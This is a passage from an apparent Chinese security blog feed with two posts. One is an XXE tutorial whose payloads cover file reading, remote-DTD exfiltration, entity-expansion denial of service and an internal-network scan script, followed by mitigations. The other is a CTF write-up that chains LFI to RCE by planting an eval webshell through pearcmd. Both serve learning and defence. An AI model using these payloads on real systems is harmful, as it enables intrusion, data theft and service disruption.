        <content type="html"><![CDATA[<h1 id="XXE外部实体漏洞"><a href="#XXE外部实体漏洞" class="headerlink" title="XXE外部实体漏洞"></a>XXE外部实体漏洞</h1><h2 id="XML和DTD"><a href="#XML和DTD" class="headerlink" title="XML和DTD"></a>XML和DTD</h2><h3 id="XML与HTML的区别"><a href="#XML与HTML的区别" class="headerlink" title="XML与HTML的区别"></a>XML与HTML的区别</h3><p>XML是被设计为传输和存储数据，其焦点是数据的内容</p><p>HTML被设计用来显示数据，其焦点是数据的外观</p><p>HTML主要是显示信息，而XML主要传输信息</p><p>所以，如果不严谨的话，就会造成XML去传输一些恶意的信息</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置（就是有上传xml文件的入口点），没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; //声明XML文档</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;//DTD文档定义类型</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;//文档元素，元素是自由设定的。</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt; //但是一定要有根元素和分支，并且正确嵌套</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DTD（文档定义类型）-实体"><a href="#DTD（文档定义类型）-实体" class="headerlink" title="DTD（文档定义类型）-实体"></a>DTD（文档定义类型）-实体</h3><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</strong></p><p><strong>实体引用是对实体的引用。</strong></p><p><strong>实体可在内部或外部进行声明。</strong></p><h5 id="作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方"><a href="#作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方" class="headerlink" title="作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方"></a>作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方</h5><h4 id="内部实体的声明"><a href="#内部实体的声明" class="headerlink" title="内部实体的声明"></a>内部实体的声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line"></span><br><span class="line">DTD中：</span><br><span class="line">例子：</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML中：</span><br><span class="line">一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br><span class="line">例子;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">语法:</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">DTD中：</span><br><span class="line">例子：</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.baidu.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML中：</span><br><span class="line">例子：</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h3><p>当允许引用外部实体时，由于XML注重于数据的传输，所以通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h4 id="方式1"><a href="#方式1" class="headerlink" title="方式1:"></a>方式1:</h4><h4 id="通过协议来引用，不过不同的程序支持的协议不一样"><a href="#通过协议来引用，不过不同的程序支持的协议不一样" class="headerlink" title="通过协议来引用，不过不同的程序支持的协议不一样"></a>通过协议来引用，不过不同的程序支持的协议不一样</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091426966.png" alt="img"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">    &lt;!ENTITY Y SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&amp;Y&lt;/user&gt;</span><br><span class="line">//上传该文件就会返回/etc/passwd的内容</span><br></pre></td></tr></table></figure><h4 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">    &lt;!ENTITY Y SYSTEM &quot;http://www.baidu.com&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&amp;Y&lt;/user&gt;</span><br></pre></td></tr></table></figure><h4 id="方式3（数据外带—在xxe的盲注中可以使用）："><a href="#方式3（数据外带—在xxe的盲注中可以使用）：" class="headerlink" title="方式3（数据外带—在xxe的盲注中可以使用）："></a>方式3（数据外带—在xxe的盲注中可以使用）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [   </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;  </span><br><span class="line">%remote;  </span><br><span class="line">]&gt;  </span><br><span class="line">  </span><br><span class="line">shell.dtd  </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;  </span><br><span class="line">%int;  </span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091658763.png" alt="img"></p><h4 id="方式4（内部DTD-参数外部实体）："><a href="#方式4（内部DTD-参数外部实体）：" class="headerlink" title="方式4（内部DTD+参数外部实体）："></a>方式4（内部DTD+参数外部实体）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY %name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br><span class="line">//注意：%name（参数实体）是在 DTD 中被引用的，而&amp;name（其余实体）实在 xml 文档中被引用</span><br><span class="line">的。</span><br></pre></td></tr></table></figure><h4 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">双重实体编码绕过</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!DOCTYPE GVI [  </span><br><span class="line">  </span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;  </span><br><span class="line">  </span><br><span class="line">    %xml;</span><br><span class="line"></span><br><span class="line">编码内容:</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;  </span><br><span class="line">&lt;core&gt;  </span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;  </span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><h4 id="拒绝服务攻击代码"><a href="#拒绝服务攻击代码" class="headerlink" title="拒绝服务攻击代码"></a>拒绝服务攻击代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [ </span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt; </span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br><span class="line">&lt;--XML解析器尝试解析该文件时，由于DTD的定义指数级展开（即递归引用),举个例子，这里定义了一个lol的实体，实体还有“lol”的字符串，然后定义了一个lol2的实体，里面有10个&quot;lol&quot;的字符串，依次递推，一个lol3实体引用10个lol2实体，这样的话可以一直向服务器传输文件，也就是形成了DOS攻击，经过XML解析器解析后的内存占用会比其本身大的多。--&gt;</span><br></pre></td></tr></table></figure><h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file://proc/net/fib_trie&quot;&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe&lt;/user&gt;</span><br><span class="line">]&gt;</span><br><span class="line">file:///etc/hosts 储存域名解析的缓存</span><br><span class="line"></span><br><span class="line">file:///proc/net/arp arp表，可以获得内网其他机器的地址</span><br><span class="line"></span><br><span class="line">file:///proc/net/tcp</span><br><span class="line"></span><br><span class="line">file:///proc/net/udp</span><br><span class="line"></span><br><span class="line">file:///proc/net/dev</span><br><span class="line"></span><br><span class="line">file:///proc/net/fib_trie 路由缓存</span><br><span class="line"></span><br><span class="line">file:///etc/passwd 用户密码</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="内网扫描脚本（借用大佬的脚本）"><a href="#内网扫描脚本（借用大佬的脚本）" class="headerlink" title="内网扫描脚本（借用大佬的脚本）"></a>内网扫描脚本（借用<a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">大佬的脚本</a>）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line">url=<span class="string">&quot;http://185729a2-949c-44fb-ac39-c16282525e73.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE note [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;123&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">xxe修复</span><br><span class="line"></span><br><span class="line">方案：使用开发语言提供的禁用外部实体的方法</span><br><span class="line"></span><br><span class="line">1.PHP：</span><br><span class="line">libxml\_disable\_entity\_loader(true);//设置为true时禁止解析xml外部实体</span><br><span class="line"></span><br><span class="line">2.JAVA:</span><br><span class="line">DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">3.Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData=etree.parse(xmlSource,etree.XMLParser(resolve\_entities=False))</span><br></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.cnblogs.com/happystudyhuan/p/11774626.html">XXE漏洞-再简单一点点</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防——XXE漏洞攻防</a></p><p><a href="https://blog.51cto.com/u_13953961/3107472">XXE外部实体注入漏洞——PHP</a></p><p><a href="https://blog.csdn.net/weixin_26750831/article/details/115201337?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172050770116800211510330%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172050770116800211510330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-115201337-null-null.142%5Ev100%5Epc_search_result_base2&utm_term=php%20xxe&spm=1018.2226.3001.4187">php xxe注入,XXE的原理利用方式及修复</a></p><p><a href="https://blog.csdn.net/logic1001/article/details/136590382?ops_request_misc=&request_id=&biz_id=102&utm_term=php%20xxe&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-136590382.142%5Ev100%5Epc_search_result_base2&spm=1018.2226.3001.4187">渗透攻击零基础学习-XXE（非常详细）零基础入门到精通，收藏这一篇就够了！！！</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">BUUCTF题解 NCTF2019 True XML cookbook–Article</a></p><p><a href="https://peekaboo.show/untitled-7/">[NCTF2019]True XML cookbook 1-peekaboo</a></p><p><a href="https://blog.csdn.net/weixin_43221560/article/details/108152738">XXE漏洞-内网探测</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NewStarCTF 2023 公开赛道]Include 🍐--LFI to RCE</title>
      <link href="/2024/07/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90-LFI-to-RCE/"/>
      <url>/2024/07/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90-LFI-to-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-公开赛道-Include-🍐"><a href="#NewStarCTF-2023-公开赛道-Include-🍐" class="headerlink" title="[NewStarCTF 2023 公开赛道]Include 🍐"></a>[NewStarCTF 2023 公开赛道]Include 🍐</h1><p>上来看到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>传一个phpinfo看看是什么</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101549638.png" alt="img"></p><p>一个假的flag，不过这是个提示，那我们看一下register_argc_argv是什么玩意</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101552331.png" alt="img"></p><p>开启状态，那我就得查查资料了，这个register_argc_argv的作用</p><p>直接放文章链接：<a href="https://cloud.tencent.com/developer/article/2204400">https://cloud.tencent.com/developer/article/2204400</a>     <a href="https://www.cnblogs.com/Yu--/p/15788689.html">https://www.cnblogs.com/Yu--/p/15788689.html</a>      <a href="https://blog.csdn.net/weixin_53090346/article/details/127241278">https://blog.csdn.net/weixin_53090346/article/details/127241278</a></p><p>这个主要是用的是包含pearcmd.php这个文件来执行命令，然后借用大佬的图哈</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101557767.png" alt="img"></p><p>可以看到，里面有一个config-create参数，这个就是去创建文件的命令，不过要用+来隔开（底层原因：<a href="https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi=omq7qGNDQieiKO+mjowcGAbD#toc-0%EF%BC%89">https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi%3Domq7qGNDQieiKO%2BmjowcGAbD#toc-0）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所以，构造我们的payload</span><br><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/<span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])<span class="meta">?&gt;</span>+./a.php</span><br><span class="line">不同的系统pearcmd存放的位置好像不一定， 有的在/usr/share/php/pearcmd.php。</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101614305.png" alt="img"></p><p>注意：用BP进行操作，不然在浏览器中&lt;&gt;就会被URL编码，就会导致我们的马不管用了</p><p>然后，POST传入执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=./a</span><br><span class="line">POST:a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101621878.png" alt="img"></p><p>本题考查的是LFI文件包含和RCE的结合，关键点是在pearcmd.php上，不过这种使用方法只能是register_argc_argv开启状态才行。不过如果可以上传文件的话，可以进行上传容器配置文件来改变关闭状态（参考：<a href="https://cloud.tencent.com/developer/article/2204400%EF%BC%89">https://cloud.tencent.com/developer/article/2204400）</a></p><p>当然，LFI可以做的事还很多比如还可以提权（参考文章:<a href="https://www.freebuf.com/articles/web/253102.html%EF%BC%89">https://www.freebuf.com/articles/web/253102.html）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> LFI </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2020]Roamphp4-Rceme WP</title>
      <link href="/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/"/>
      <url>/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/</url>
      
